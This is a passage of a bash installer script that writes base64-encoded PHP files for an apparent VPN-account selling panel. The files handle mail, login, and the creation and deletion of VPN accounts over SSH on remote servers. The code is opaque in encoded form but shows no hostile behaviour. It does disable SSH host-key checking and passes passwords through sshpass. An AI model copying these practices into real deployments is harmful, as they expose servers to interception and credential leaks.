Hx8IGVtcHR5KCRzbXRwUGFzcykpIHJldHVybiBmYWxzZTsKCiAgICAvLyBVc2UgUEhQTWFpbGVyLWNvbXBhdGlibGUgcmF3IFNNVFAgdmlhIGZzb2Nrb3BlbgogICAgJGJvdW5kYXJ5ID0gbWQ1KHRpbWUoKSk7CiAgICAkaGVhZGVycyAgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKICAgICRoZWFkZXJzIC49ICJDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOFxyXG4iOwogICAgJGhlYWRlcnMgLj0gIkZyb206IHskYXBwTmFtZX0gPHskc210cEZyb219PlxyXG4iOwogICAgJGhlYWRlcnMgLj0gIlRvOiB7JHRvfVxyXG4iOwogICAgJGhlYWRlcnMgLj0gIlN1YmplY3Q6IHskc3ViamVjdH1cclxuIjsKCiAgICAvLyBVc2UgbWFpbCgpIGFzIGZhbGxiYWNrIOKAlCB3b3JrcyBpZiBzZW5kbWFpbCBjb25maWd1cmVkCiAgICAvLyBGb3IgR21haWwgU01UUCwgdXNlIHByb2Nfb3BlbiB3aXRoIGN1cmwKICAgICRjbWQgPSBzcHJpbnRmKAogICAgICAgICdjdXJsIC0tdXJsICJzbXRwOi8vJXM6JWQiIC0tc3NsLXJlcWQgLS1tYWlsLWZyb20gIiVzIiAtLW1haWwtcmNwdCAiJXMiIC0tdXNlciAiJXM6JXMiIC1UIC0gMj4vZGV2L251bGwnLAogICAgICAgIGVzY2FwZXNoZWxsYXJnKCRzbXRwSG9zdCksICRzbXRwUG9ydCwKICAgICAgICBlc2NhcGVzaGVsbGFyZygkc210cEZyb20pLCBlc2NhcGVzaGVsbGFyZygkdG8pLAogICAgICAgIGVzY2FwZXNoZWxsYXJnKCRzbXRwVXNlciksIGVzY2FwZXNoZWxsYXJnKCRzbXRwUGFzcykKICAgICk7CiAgICAkbXNnICA9ICJGcm9tOiB7JGFwcE5hbWV9IDx7JHNtdHBGcm9tfT5cclxuIjsKICAgICRtc2cgLj0gIlRvOiB7JHRvfVxyXG4iOwogICAgJG1zZyAuPSAiU3ViamVjdDogeyRzdWJqZWN0fVxyXG4iOwogICAgJG1zZyAuPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKICAgICRtc2cgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04XHJcblxyXG4iOwogICAgJG1zZyAuPSAkaHRtbEJvZHk7CgogICAgJGRlc2MgPSBbMD0+WydwaXBlJywnciddLDE9PlsncGlwZScsJ3cnXSwyPT5bJ3BpcGUnLCd3J11dOwogICAgJHByb2MgPSBwcm9jX29wZW4oJGNtZCwgJGRlc2MsICRwaXBlcyk7CiAgICBpZiAoaXNfcmVzb3VyY2UoJHByb2MpKSB7CiAgICAgICAgZndyaXRlKCRwaXBlc1swXSwgJG1zZyk7CiAgICAgICAgZmNsb3NlKCRwaXBlc1swXSk7CiAgICAgICAgZmNsb3NlKCRwaXBlc1sxXSk7CiAgICAgICAgZmNsb3NlKCRwaXBlc1syXSk7CiAgICAgICAgJGNvZGUgPSBwcm9jX2Nsb3NlKCRwcm9jKTsKICAgICAgICByZXR1cm4gJGNvZGUgPT09IDA7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCmZ1bmN0aW9uIHJlcXVpcmVMb2dpbigpIHsKICAgIGlmIChzZXNzaW9uX3N0YXR1cygpPT09UEhQX1NFU1NJT05fTk9ORSkgc2Vzc2lvbl9zdGFydCgpOwogICAgaWYgKCFpc3NldCgkX1NFU1NJT05bJ3VzZXJfaWQnXSkpIHsKICAgICAgICBpZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddPz8nJywnL2FwaS8nKSE9PWZhbHNlKSB7CiAgICAgICAgICAgIGhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyk7CiAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nVW5hdXRob3JpemVkJ10pOyBleGl0OwogICAgICAgIH0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vJyk7IGV4aXQ7CiAgICB9CiAgICAvLyBSZWZyZXNoIHNhbGRvCiAgICB0cnkgewogICAgICAgICRkYiA9IGdldERCKCk7CiAgICAgICAgJHMgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBzYWxkbyxpc192ZXJpZmllZCBGUk9NIHVzZXJzIFdIRVJFIGlkPT8iKTsKICAgICAgICAkcy0+ZXhlY3V0ZShbJF9TRVNTSU9OWyd1c2VyX2lkJ11dKTsKICAgICAgICAkdSA9ICRzLT5mZXRjaCgpOwogICAgICAgIGlmICgkdSkgJF9TRVNTSU9OWydzYWxkbyddID0gJHVbJ3NhbGRvJ107CiAgICB9IGNhdGNoKEV4Y2VwdGlvbiAkZSl7fQogICAgcmV0dXJuICRfU0VTU0lPTjsKfQoKZnVuY3Rpb24gcmVxdWlyZUFkbWluKCkgewogICAgJHMgPSByZXF1aXJlTG9naW4oKTsKICAgIGlmICgoJHNbJ3JvbGUnXT8/JycpICE9PSAnYWRtaW4nKSB7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2Rhc2hib2FyZC5waHAnKTsgZXhpdDsKICAgIH0KICAgIHJldHVybiAkczsKfQo=" | base64 -d > "$DIR"/includes/config.php



    # FIXED: Inject DB_PASS asli ke config.php (mengganti hardcoded password123)



    # Escape special characters in DB_PASS for sed



    local ESCAPED_DB_PASS="${DB_PASS//|/\|}"



    ESCAPED_DB_PASS="${ESCAPED_DB_PASS//&/\&}"



    sed -i "s|define('DB_PASS', 'password123')|define('DB_PASS', '${ESCAPED_DB_PASS}')|g" "$DIR"/includes/config.php



    # includes/vpn_manager.php



    echo "PD9waHAKLy8gdnBuX21hbmFnZXIucGhwIHYyLjAg4oCUIE11bHRpLVZQUyBTU0ggKyBMb2NhbCBBUEkKcmVxdWlyZV9vbmNlIF9fRElSX18uJy9jb25maWcucGhwJzsKCmNsYXNzIFZQTk1hbmFnZXIgewoKICAgIC8vIOKUgOKUgCBDUkVBVEUgdmlhIFNTSCBrZSBWUFMgdGFyZ2V0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBjcmVhdGVBY2NvdW50KCRzZXJ2ZXIsICR0eXBlLCAkdXNlcm5hbWUsICRkYXlzLCAkcXVvdGE9MTAwLCAkaXBsaW1pdD0yKSB7CiAgICAgICAgJHVzZXJuYW1lID0gcHJlZ19yZXBsYWNlKCcvW15hLXpBLVowLTlfXC1dLycsJycsICR1c2VybmFtZSk7CiAgICAgICAgaWYgKGVtcHR5KCR1c2VybmFtZSkpIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidVc2VybmFtZSB0aWRhayB2YWxpZCddOwogICAgICAgIGlmICghaW5fYXJyYXkoc3RydG9sb3dlcigkdHlwZSksWydzc2gnLCd2bWVzcycsJ3ZsZXNzJywndHJvamFuJywndHJpYWwnXSkpCiAgICAgICAgICAgIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidUaXBlIHRpZGFrIGRpZHVrdW5nJ107CgogICAgICAgICRob3N0ID0gJHNlcnZlclsnaG9zdCddID8/ICcnOwogICAgICAgICRpc0xvY2FsID0gc2VsZjo6aXNMb2NhbEhvc3QoJGhvc3QpOwoKICAgICAgICBpZiAoJGlzTG9jYWwpIHsKICAgICAgICAgICAgcmV0dXJuIHNlbGY6OmNhbGxMb2NhbEFQSSgnY3JlYXRlJywgJHR5cGUsICR1c2VybmFtZSwgJGRheXMsICRxdW90YSwgJGlwbGltaXQpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gc2VsZjo6Y2FsbFJlbW90ZVNTSCgkc2VydmVyLCAnY3JlYXRlJywgJHR5cGUsICR1c2VybmFtZSwgJGRheXMsICRxdW90YSwgJGlwbGltaXQpOwogICAgfQoKICAgIC8vIOKUgOKUgCBERUxFVEUg4oCUIGZpeDogc2VsYWx1IGhhcHVzIGRpIHNlcnZlciB0dWp1YW4g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGRlbGV0ZUFjY291bnQoJHNlcnZlciwgJHR5cGUsICR1c2VybmFtZSkgewogICAgICAgIGlmIChlbXB0eSgkdXNlcm5hbWUpKSByZXR1cm4gWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nVXNlcm5hbWUga29zb25nJ107CiAgICAgICAgJGhvc3QgPSAkc2VydmVyWydob3N0J10gPz8gJyc7CiAgICAgICAgJGlzTG9jYWwgPSBzZWxmOjppc0xvY2FsSG9zdCgkaG9zdCk7CgogICAgICAgIGlmICgkaXNMb2NhbCkgewogICAgICAgICAgICAkb3V0ID0gc2hlbGxfZXhlYyhzcHJpbnRmKCdzdWRvICVzIGRlbGV0ZSAlcyAlcyAyPiYxJywKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsY21kKFZQTl9BUElfQlJJREdFKSwKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKHN0cnRvbG93ZXIoJHR5cGUpKSwKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKCR1c2VybmFtZSkKICAgICAgICAgICAgKSk7CiAgICAgICAgICAgIHJldHVybiBqc29uX2RlY29kZSh0cmltKCRvdXQ/PycnKSwgdHJ1ZSkgPz8gWydzdWNjZXNzJz0+dHJ1ZV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBzZWxmOjpjYWxsUmVtb3RlU1NIKCRzZXJ2ZXIsICdkZWxldGUnLCAkdHlwZSwgJHVzZXJuYW1lKTsKICAgIH0KCiAgICAvLyDilIDilIAgVFJJQUwg4oCUIGJ1YXQgYWt1biAxIGphbSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gY3JlYXRlVHJpYWwoJHNlcnZlciwgJHR5cGUsICR1c2VybmFtZSkgewogICAgICAgIC8vIFRyaWFsID0gMSBqYW0sIHF1b3RhIDFHQiwgaXAgbGltaXQgMQogICAgICAgIC8vIEtpdGEgc2ltcGFuIHNlYmFnYWkgMSBoYXJpIGRpIHNlcnZlciwgZXhwaXJ5IGRpIERCID0gMSBqYW0gZGFyaSBzZWthcmFuZwogICAgICAgIHJldHVybiBzZWxmOjpjcmVhdGVBY2NvdW50KCRzZXJ2ZXIsICR0eXBlLCAkdXNlcm5hbWUsIDEsIDEsIDEpOwogICAgfQoKICAgIC8vIOKUgOKUgCBTVEFUVVMgU0VSVkVSIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBjaGVja1NlcnZlclN0YXR1cygkc2VydmVyKSB7CiAgICAgICAgJGhvc3QgPSAkc2VydmVyWydob3N0J10gPz8gJyc7CiAgICAgICAgJHBvcnQgPSAkc2VydmVyWydwb3J0J10gPz8gMjI7CiAgICAgICAgaWYgKHNlbGY6OmlzTG9jYWxIb3N0KCRob3N0KSkgewogICAgICAgICAgICAkb3V0ID0gc2hlbGxfZXhlYygnc3VkbyAnLlZQTl9BUElfQlJJREdFLicgc3RhdHVzIDI+L2Rldi9udWxsJyk7CiAgICAgICAgICAgICRyID0ganNvbl9kZWNvZGUodHJpbSgkb3V0Pz8nJyksIHRydWUpOwogICAgICAgICAgICByZXR1cm4gKCRyWyd4cmF5J10/PycnKSA9PT0gJ2FjdGl2ZScgPyAncmVhZHknIDogJ29mZmxpbmUnOwogICAgICAgIH0KICAgICAgICAvLyBDZWsgcG9ydCBTU0ggcmVtb3RlCiAgICAgICAgJGNvbm4gPSBAZnNvY2tvcGVuKCRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCA1KTsKICAgICAgICBpZiAoJGNvbm4pIHsgZmNsb3NlKCRjb25uKTsgcmV0dXJuICdyZWFkeSc7IH0KICAgICAgICByZXR1cm4gJ29mZmxpbmUnOwogICAgfQoKICAgIC8vIOKUgOKUgCBQUk9DRVNTIEVYUElSRUQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHByb2Nlc3NFeHBpcmVkQWNjb3VudHMoKSB7CiAgICAgICAgJGRiID0gZ2V0REIoKTsKICAgICAgICAvLyBUcmlhbCBkYW4gYWt1biBiaWFzYSB5YW5nIHN1ZGFoIGV4cGlyZWQKICAgICAgICAkc3RtdCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIHZhLiosIHMuaG9zdCwgcy5wb3J0LCBzLnNzaF91c2VyLCBzLnNzaF9wYXNzd29yZCwgcy5zc2hfa2V5IAogICAgICAgICAgICBGUk9NIHZwbl9hY2NvdW50cyB2YSAKICAgICAgICAgICAgSk9JTiBzZXJ2ZXJzIHMgT04gdmEuc2VydmVyX2lkID0gcy5pZCAKICAgICAgICAgICAgV0hFUkUgdmEubWFzYV9ha3RpZiA8IE5PVygpIEFORCB2YS5zdGF0dXMgPSAnYWN0aXZlJyIpOwogICAgICAgICRzdG10LT5leGVjdXRlKCk7CiAgICAgICAgJGV4cGlyZWQgPSAkc3RtdC0+ZmV0Y2hBbGwoKTsKICAgICAgICAkY291bnQgPSAwOwogICAgICAgIGZvcmVhY2ggKCRleHBpcmVkIGFzICRhY2MpIHsKICAgICAgICAgICAgc2VsZjo6ZGVsZXRlQWNjb3VudCgkYWNjLCAkYWNjWyd0aXBlJ10sICRhY2NbJ3VzZXJuYW1lJ10pOwogICAgICAgICAgICAkZGItPnByZXBhcmUoIlVQREFURSB2cG5fYWNjb3VudHMgU0VUIHN0YXR1cz0nZXhwaXJlZCcgV0hFUkUgaWQ9PyIpLT5leGVjdXRlKFskYWNjWydpZCddXSk7CiAgICAgICAgICAgICRjb3VudCsrOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGNvdW50OwogICAgfQoKICAgIC8vIOKUgOKUgCBQUklWQVRFOiBDZWsgYXBha2FoIGhvc3QgPSBsb2thbCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgIHByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIGlzTG9jYWxIb3N0KCRob3N0KSB7CiAgICAgICAgJGxvY2FsID0gWydsb2NhbGhvc3QnLCcxMjcuMC4wLjEnLCc6OjEnXTsKICAgICAgICBpZiAoaW5fYXJyYXkoJGhvc3QsICRsb2NhbCkpIHJldHVybiB0cnVlOwogICAgICAgIC8vIEJhbmRpbmdrYW4gZGVuZ2FuIElQIHNlbmRpcmkKICAgICAgICAkbXlJUCA9IHRyaW0oc2hlbGxfZXhlYygnY3VybCAtcyAtLW1heC10aW1lIDMgaWZjb25maWcubWUgMj4vZGV2L251bGwnKSA/OiAnJyk7CiAgICAgICAgaWYgKCFlbXB0eSgkbXlJUCkgJiYgJGhvc3QgPT09ICRteUlQKSByZXR1cm4gdHJ1ZTsKICAgICAgICAkbXlJUExvY2FsID0gdHJpbShzaGVsbF9leGVjKCJob3N0bmFtZSAtSSB8IGF3ayAne3ByaW50IFwkMX0nIDI+L2Rldi9udWxsIikgPzogJycpOwogICAgICAgIGlmICghZW1wdHkoJG15SVBMb2NhbCkgJiYgJGhvc3QgPT09ICRteUlQTG9jYWwpIHJldHVybiB0cnVlOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvLyDilIDilIAgUFJJVkFURTogUGFuZ2dpbCBsb2thbCB2cG4tYXBpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gY2FsbExvY2FsQVBJKCRhY3Rpb24sICR0eXBlLCAkdXNlcm5hbWUsICRkYXlzPTAsICRxdW90YT0xMDAsICRpcGxpbWl0PTEpIHsKICAgICAgICBpZiAoIWlzX2V4ZWN1dGFibGUoVlBOX0FQSV9CUklER0UpICYmICFmaWxlX2V4aXN0cyhWUE5fQVBJX0JSSURHRSkpCiAgICAgICAgICAgIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9Pid2cG4tYXBpIGJyaWRnZSB0aWRhayBkaXRlbXVrYW4nXTsKCiAgICAgICAgJGNtZCA9IHNwcmludGYoJ3N1ZG8gJXMgJXMgJXMgJXMgJWQgJWQgJWQgMj4mMScsCiAgICAgICAgICAgIGVzY2FwZXNoZWxsY21kKFZQTl9BUElfQlJJREdFKSwKICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJGFjdGlvbiksCiAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKHN0cnRvbG93ZXIoJHR5cGUpKSwKICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHVzZXJuYW1lKSwKICAgICAgICAgICAgKGludCkkZGF5cywgKGludCkkcXVvdGEsIChpbnQpJGlwbGltaXQKICAgICAgICApOwogICAgICAgICRvdXRwdXQgPSBzaGVsbF9leGVjKCRjbWQpOwogICAgICAgIGlmIChlbXB0eSgkb3V0cHV0KSkgcmV0dXJuIFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1RpZGFrIGFkYSBvdXRwdXQgZGFyaSB2cG4tYXBpJ107CiAgICAgICAgJHJlc3VsdCA9IGpzb25fZGVjb2RlKHRyaW0oJG91dHB1dCksIHRydWUpOwogICAgICAgIGlmICghaXNfYXJyYXkoJHJlc3VsdCkpIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidPdXRwdXQgdGlkYWsgdmFsaWQ6ICcuc3Vic3RyKCRvdXRwdXQsMCwzMDApXTsKICAgICAgICBpZiAoIWVtcHR5KCRyZXN1bHRbJ3N1Y2Nlc3MnXSkpIHsKICAgICAgICAgICAgJHJlc3VsdFsnbGlua19jb25maWcnXSA9ICRyZXN1bHRbJ2xpbmtfdGxzJ10gPz8gJHJlc3VsdFsnbGlua19jb25maWcnXSA/PyAnJzsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CgogICAgLy8g4pSA4pSAIFBSSVZBVEU6IFNTSCBrZSBWUFMgcmVtb3RlIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gY2FsbFJlbW90ZVNTSCgkc2VydmVyLCAkYWN0aW9uLCAkdHlwZSwgJHVzZXJuYW1lLCAkZGF5cz0wLCAkcXVvdGE9MTAwLCAkaXBsaW1pdD0xKSB7CiAgICAgICAgJGhvc3QgICAgPSAkc2VydmVyWydob3N0J107CiAgICAgICAgJHBvcnQgICAgPSAkc2VydmVyWydwb3J0J10gPz8gMjI7CiAgICAgICAgJHNzaFVzZXIgPSAkc2VydmVyWydzc2hfdXNlciddID8/ICdyb290JzsKICAgICAgICAkc3NoS2V5ICA9ICRzZXJ2ZXJbJ3NzaF9rZXknXSA/PyBTU0hfS0VZX1BBVEg7CiAgICAgICAgJHNzaFBhc3MgPSAkc2VydmVyWydzc2hfcGFzc3dvcmQnXSA/PyAnJzsKCiAgICAgICAgLy8gQnVpbGQgcmVtb3RlIGNvbW1hbmQg4oCUIHBhbmdnaWwgdnBuLWFwaSBkaSBWUFMgcmVtb3RlCiAgICAgICAgaWYgKCRhY3Rpb24gPT09ICdjcmVhdGUnKSB7CiAgICAgICAgICAgICRyZW1vdGVDbWQgPSBzcHJpbnRmKCdzdWRvIC91c3IvbG9jYWwvYmluL3Zwbi1hcGkgY3JlYXRlICVzICVzICVkICVkICVkIDI+JjEnLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoc3RydG9sb3dlcigkdHlwZSkpLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHVzZXJuYW1lKSwKICAgICAgICAgICAgICAgIChpbnQpJGRheXMsIChpbnQpJHF1b3RhLCAoaW50KSRpcGxpbWl0CiAgICAgICAgICAgICk7CiAgICAgICAgfSBlbHNlaWYgKCRhY3Rpb24gPT09ICdkZWxldGUnKSB7CiAgICAgICAgICAgICRyZW1vdGVDbWQgPSBzcHJpbnRmKCdzdWRvIC91c3IvbG9jYWwvYmluL3Zwbi1hcGkgZGVsZXRlICVzICVzIDI+JjEnLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoc3RydG9sb3dlcigkdHlwZSkpLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHVzZXJuYW1lKQogICAgICAgICAgICApOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRyZW1vdGVDbWQgPSAnc3VkbyAvdXNyL2xvY2FsL2Jpbi92cG4tYXBpIHN0YXR1cyAyPiYxJzsKICAgICAgICB9CgogICAgICAgIC8vIENvYmEgcGFrYWkgU1NIIGtleSBkdWx1LCBmYWxsYmFjayBrZSBzc2hwYXNzIGppa2EgYWRhIHBhc3N3b3JkCiAgICAgICAgaWYgKCFlbXB0eSgkc3NoS2V5KSAmJiBmaWxlX2V4aXN0cygkc3NoS2V5KSkgewogICAgICAgICAgICAkc3NoQ21kID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICdzc2ggLWkgJXMgLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTE1IC1vIEJhdGNoTW9kZT15ZXMgLXAgJWQgJXNAJXMgJXMgMj4mMScsCiAgICAgICAgICAgICAgICBlc2NhcGVzaGVsbGFyZygkc3NoS2V5KSwgKGludCkkcG9ydCwKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKCRzc2hVc2VyKSwgZXNjYXBlc2hlbGxhcmcoJGhvc3QpLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHJlbW90ZUNtZCkKICAgICAgICAgICAgKTsKICAgICAgICB9IGVsc2VpZiAoIWVtcHR5KCRzc2hQYXNzKSAmJiBzaGVsbF9leGVjKCd3aGljaCBzc2hwYXNzIDI+L2Rldi9udWxsJykpIHsKICAgICAgICAgICAgJHNzaENtZCA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAnc3NocGFzcyAtcCAlcyBzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTE1IC1wICVkICVzQCVzICVzIDI+JjEnLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHNzaFBhc3MpLCAoaW50KSRwb3J0LAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHNzaFVzZXIpLCBlc2NhcGVzaGVsbGFyZygkaG9zdCksCiAgICAgICAgICAgICAgICBlc2NhcGVzaGVsbGFyZygkcmVtb3RlQ21kKQogICAgICAgICAgICApOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidUaWRhayBhZGEgU1NIIGtleSBhdGF1IHNzaHBhc3MgdW50dWsga29uZWtzaSBrZSAnLiRob3N0XTsKICAgICAgICB9CgogICAgICAgIGV4ZWMoJHNzaENtZCwgJG91dHB1dEFyciwgJGV4aXRDb2RlKTsKICAgICAgICAkb3V0cHV0ID0gaW1wbG9kZSgiXG4iLCAkb3V0cHV0QXJyKTsKCiAgICAgICAgaWYgKCRleGl0Q29kZSAhPT0gMCkgewogICAgICAgICAgICByZXR1cm4gWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nU1NIIGdhZ2FsIChleGl0ICcuJGV4aXRDb2RlLicpOiAnLnN1YnN0cigkb3V0cHV0LDAsMzAwKV07CiAgICAgICAgfQoKICAgICAgICAvLyBDYXJpIGJhcmlzIEpTT04gZGkgb3V0cHV0CiAgICAgICAgJGpzb25MaW5lID0gJyc7CiAgICAgICAgZm9yZWFjaCAoYXJyYXlfcmV2ZXJzZSgkb3V0cHV0QXJyKSBhcyAkbGluZSkgewogICAgICAgICAgICAkbGluZSA9IHRyaW0oJGxpbmUpOwogICAgICAgICAgICBpZiAoc3RycG9zKCRsaW5lLCd7Jyk9PT0wKSB7ICRqc29uTGluZT0kbGluZTsgYnJlYWs7IH0KICAgICAgICB9CgogICAgICAgICRyZXN1bHQgPSBqc29uX2RlY29kZSgkanNvbkxpbmUsIHRydWUpOwogICAgICAgIGlmICghaXNfYXJyYXkoJHJlc3VsdCkpIHsKICAgICAgICAgICAgLy8gU1NIIGJlcmhhc2lsIHRhcGkgb3V0cHV0IGJ1a2FuIEpTT04g4oCUIGFuZ2dhcCBzdWtzZXMgdW50dWsgZGVsZXRlCiAgICAgICAgICAgIGlmICgkYWN0aW9uPT09J2RlbGV0ZScpIHJldHVybiBbJ3N1Y2Nlc3MnPT50cnVlLCdtZXNzYWdlJz0+J0RlbGV0ZWQnXTsKICAgICAgICAgICAgcmV0dXJuIFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J091dHB1dCB0aWRhayB2YWxpZCBkYXJpIHJlbW90ZTogJy5zdWJzdHIoJG91dHB1dCwwLDMwMCldOwogICAgICAgIH0KICAgICAgICBpZiAoIWVtcHR5KCRyZXN1bHRbJ3N1Y2Nlc3MnXSkpIHsKICAgICAgICAgICAgJHJlc3VsdFsnbGlua19jb25maWcnXSA9ICRyZXN1bHRbJ2xpbmtfdGxzJ10gPz8gJHJlc3VsdFsnbGlua19jb25maWcnXSA/PyAnJzsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9Cn0K" | base64 -d > "$DIR"/includes/vpn_manager.php



    # index.php



    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy9pbmNsdWRlcy9jb25maWcucGhwJzsKaWYgKHNlc3Npb25fc3RhdHVzKCk9PT1QSFBfU0VTU0lPTl9OT05FKSBzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX1NFU1NJT05bJ3VzZXJfaWQnXSkpIHsgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2Rhc2hib2FyZC5waHAnKTsgZXhpdDsgfQoKJGFwcE5hbWUgPSBnZXRTZXR0aW5nKCdhcHBfbmFtZScsJ09yZGVyVlBOJyk7CiRlcnJvciA9ICcnOyAkc3VjY2VzcyA9ICcnOwoKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddPT09J1BPU1QnKSB7CiAgICAkYWN0aW9uID0gJF9QT1NUWydhY3Rpb24nXSA/PyAnJzsKCiAgICBpZiAoJGFjdGlvbj09PSdsb2dpbicpIHsKICAgICAgICAkdSA9IHNhbml0aXplKCRfUE9TVFsndXNlcm5hbWUnXT8/JycpOwogICAgICAgICRwID0gJF9QT1NUWydwYXNzd29yZCddPz8nJzsKICAgICAgICBpZiAoZW1wdHkoJHUpfHxlbXB0eSgkcCkpIHsgJGVycm9yPSdVc2VybmFtZSBkYW4gcGFzc3dvcmQgd2FqaWIgZGlpc2khJzsgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkZGI9Z2V0REIoKTsKICAgICAgICAgICAgJHN0PSRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZT0/IE9SIGVtYWlsPT8iKTsKICAgICAgICAgICAgJHN0LT5leGVjdXRlKFskdSwkdV0pOyAkdXNlcj0kc3QtPmZldGNoKCk7CiAgICAgICAgICAgIGlmICgkdXNlciAmJiBwYXNzd29yZF92ZXJpZnkoJHAsJHVzZXJbJ3Bhc3N3b3JkJ10pKSB7CiAgICAgICAgICAgICAgICBpZiAoISR1c2VyWydpc192ZXJpZmllZCddICYmICR1c2VyWydyb2xlJ109PT0ndXNlcicpIHsKICAgICAgICAgICAgICAgICAgICAkZXJyb3I9J0VtYWlsIGJlbHVtIGRpdmVyaWZpa2FzaSEgQ2VrIGluYm94IGthbXUuJzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VyX2lkJ109JHVzZXJbJ2lkJ107CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VybmFtZSddPSR1c2VyWyd1c2VybmFtZSddOwogICAgICAgICAgICAgICAgICAgICRfU0